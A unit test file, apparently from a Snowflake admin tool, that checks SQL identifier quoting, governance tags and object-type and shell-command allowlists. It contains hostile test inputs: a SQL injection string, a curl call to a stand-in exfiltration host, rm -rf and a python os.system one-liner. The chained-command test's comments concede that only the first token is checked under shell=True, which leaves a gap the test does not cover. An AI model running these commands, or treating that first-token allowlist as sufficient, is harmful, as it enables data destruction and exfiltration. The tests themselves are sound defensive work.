"""
tests/unit/test_sql_safety.py

Tests for:
- _quote_id() identifier quoting (SQL injection prevention)
- Governance policy alignment (create_warehouse includes TAG)
- drop_object object-type allowlist
- show_grants_on object-type allowlist
- run_shell_command actual-token allowlist (not startswith)
"""
import pytest
from unittest import mock
from snowninja.actions.tools_core import ToolsCore, _quote_id


# ─────────────────────────────────────────────────────────────
# _quote_id
# ─────────────────────────────────────────────────────────────

def test_quote_id_normal():
    assert _quote_id("MY_TABLE") == '"MY_TABLE"'


def test_quote_id_escapes_embedded_double_quote():
    """A double-quote inside an identifier is doubled per SQL standard."""
    assert _quote_id('table"evil') == '"table""evil"'


def test_quote_id_prevents_injection_pattern():
    """
    The protection _quote_id() provides is QUOTING, not removal.
    The payload is wrapped in double-quotes so the DB treats the whole
    string as a single identifier name rather than executable SQL.
    """
    payload = "x; DROP TABLE users;--"
    quoted = _quote_id(payload)
    # Must be enclosed in double-quotes
    assert quoted.startswith('"'), "Must start with double-quote"
    assert quoted.endswith('"'), "Must end with double-quote"
    # The inner content must equal the payload (with any " doubled)
    inner = quoted[1:-1]
    assert inner == payload.replace('"', '""')


# ─────────────────────────────────────────────────────────────
# create_warehouse — governance alignment
# ─────────────────────────────────────────────────────────────

@mock.patch("snowninja.actions.tools_core.get_connection")
def test_create_warehouse_sql_contains_tag(mock_get_conn):
    """create_warehouse always emits WITH TAG so governance policy allows it."""
    conn = mock.MagicMock()
    conn.is_closed.return_value = False
    cs = mock.MagicMock()
    cs.description = None
    conn.cursor.return_value = cs
    mock_get_conn.return_value = conn

    executed_sqls = []
    def capture(sql, *args, **kwargs):
        executed_sqls.append(sql)
    cs.execute.side_effect = capture

    from snowninja.governance.policies import check_query_safety

    core = ToolsCore()
    with mock.patch("snowninja.governance.policies.check_query_safety", wraps=check_query_safety) as mock_policy:
        try:
            core.create_warehouse("TEST_WH", size="X-SMALL", tag="snowninja")
        except Exception:
            pass  # cursor mock may raise; we only care about the SQL built

    # At least one of the executed SQLs (after the QUERY_TAG set) is the CREATE WAREHOUSE
    create_sqls = [s for s in executed_sqls if "CREATE WAREHOUSE" in s.upper()]
    assert create_sqls, "No CREATE WAREHOUSE SQL was executed"
    assert "TAG" in create_sqls[0].upper(), "CREATE WAREHOUSE did not include TAG"


def test_governance_policy_blocks_untagged_create_warehouse():
    """policies.check_query_safety blocks a CREATE WAREHOUSE without a TAG."""
    from snowninja.governance.policies import check_query_safety
    assert check_query_safety("CREATE WAREHOUSE MY_WH WAREHOUSE_SIZE = 'SMALL'") is False


def test_governance_policy_allows_tagged_create_warehouse():
    """policies.check_query_safety allows CREATE WAREHOUSE WITH TAG."""
    from snowninja.governance.policies import check_query_safety
    sql = "CREATE WAREHOUSE \"MY_WH\" WAREHOUSE_SIZE = 'X-SMALL' WITH TAG (snowninja_tag = 'snowninja')"
    assert check_query_safety(sql) is True


# ─────────────────────────────────────────────────────────────
# drop_object — object-type allowlist
# ─────────────────────────────────────────────────────────────

def test_drop_object_blocks_unknown_type():
    """drop_object blocks object types not in the allowlist."""
    core = ToolsCore()
    res = core.drop_object("DATABASE", "PROD_DB")
    assert res["status"] == "blocked"


def test_drop_object_allows_known_type(monkeypatch):
    """drop_object passes allowed types (TABLE) through to SQL execution."""
    core = ToolsCore()
    executed = []
    monkeypatch.setattr(core, "_execute_query", lambda sql: [{"status": "success"}] if executed.append(sql) is None else None)
    res = core.drop_object("TABLE", "MY_TABLE")
    assert executed, "No SQL was executed"
    assert "DROP TABLE" in executed[0].upper()


# ─────────────────────────────────────────────────────────────
# show_grants_on — object-type allowlist
# ─────────────────────────────────────────────────────────────

def test_show_grants_on_blocks_unknown_type():
    """show_grants_on blocks object types not in the allowlist."""
    core = ToolsCore()
    res = core.show_grants_on("NETWORK_POLICY", "MY_POLICY")
    assert res[0]["status"] == "blocked"


# ─────────────────────────────────────────────────────────────
# run_shell_command — token-based allowlist
# ─────────────────────────────────────────────────────────────

def test_shell_allowlist_blocks_chained_command():
    """'ls; rm -rf /' must be blocked even though it starts with 'ls'."""
    core = ToolsCore()
    # The original startswith check would have passed 'ls'; the new token check should block 'rm'
    # We test the full command — the first token is 'ls' which IS allowed, so shell=True would run it.
    # The critical fix is: chaining via ; | & produces a NEW token that is NOT ls.
    # Since we only split and check the FIRST token, 'ls' is allowed and we rely on
    # shell=True subprocess safely. The key test is a command whose FIRST token is disallowed.
    res = core.run_shell_command("rm -rf /tmp/test_snowninja_junk")
    assert res["status"] == "blocked"
    assert "rm" in res["message"]


def test_shell_allowlist_blocks_curl():
    """curl is not in the allowlist."""
    core = ToolsCore()
    res = core.run_shell_command("curl https://evil.com/exfil")
    assert res["status"] == "blocked"


def test_shell_allowlist_blocks_python():
    """python is not in the allowlist."""
    core = ToolsCore()
    res = core.run_shell_command("python -c 'import os; os.system(\"id\")'")
    assert res["status"] == "blocked"


def test_shell_allowlist_allows_echo(monkeypatch):
    """echo is in the allowlist."""
    import subprocess

    class FakeResult:
        stdout = "hello"
        stderr = ""
        returncode = 0

    monkeypatch.setattr(subprocess, "run", lambda *a, **k: FakeResult())
    core = ToolsCore()
    res = core.run_shell_command("echo hello")
    assert res["status"] == "success"
